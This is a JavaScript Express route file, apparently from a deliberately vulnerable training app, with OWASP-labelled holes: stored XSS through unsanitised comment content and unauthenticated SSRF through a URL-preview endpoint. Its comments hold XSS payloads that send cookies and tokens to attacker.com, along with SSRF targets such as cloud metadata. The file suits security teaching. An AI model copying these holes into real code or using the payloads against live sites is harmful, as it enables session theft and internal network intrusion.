// routes/comments.js
// ⚠️ VULNERABILITIES:
//   A03: Stored XSS — comment content rendered as innerHTML
//   A10: SSRF — fetch any URL from server
//   A01: No rate limiting on comment creation

const express = require('express');
const router  = express.Router();
const http    = require('http');
const https   = require('https');
const { Comment } = require('../models/index');
const { authMiddleware } = require('../middleware/auth');

// ============================================================
// GET /api/comments/:productId
// Returns raw unsanitized content — rendered as HTML on frontend
// ============================================================
router.get('/:productId', async (req, res) => {
  try {
    const comments = await Comment.find({ productId: req.params.productId });
    res.json(comments);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ============================================================
// POST /api/comments
// A03: Stored XSS — content not sanitized before saving
//   Payload: <script>document.location='http://attacker.com/?c='+document.cookie</script>
//   Payload: <img src=x onerror="alert('XSS')">
//   Payload: <svg onload="fetch('http://attacker.com?data='+localStorage.getItem('token'))">
// ============================================================
router.post('/', authMiddleware, async (req, res) => {
  try {
    const { productId, content } = req.body;

    // VULN: content saved as-is, no sanitization
    const comment = new Comment({
      productId,
      userId:   req.user.userId,
      username: req.user.username,
      content   // raw HTML/JS stored in DB
    });
    await comment.save();
    res.json(comment);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ============================================================
// POST /api/comments/fetch-preview
// A10:2021 – SSRF (Server Side Request Forgery)
//   Server fetches any URL on behalf of user
//   Attack: url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
//   Attack: url=http://localhost:27017  (internal MongoDB)
//   Attack: url=http://internal-service/admin
// ============================================================
router.post('/fetch-preview', async (req, res) => {
  const { url } = req.body;

  // VULN: No URL whitelist, fetches any URL including internal ones
  const lib = url.startsWith('https') ? https : http;

  lib.get(url, (response) => {
    let data = '';
    response.on('data', chunk => data += chunk);
    response.on('end', () => {
      res.json({
        url,           // reflects URL back
        statusCode: response.statusCode,
        headers: response.headers,
        body: data.substring(0, 5000)
      });
    });
  }).on('error', (err) => {
    res.json({ url, error: err.message }); // reveals internal error
  });
});

module.exports = router;
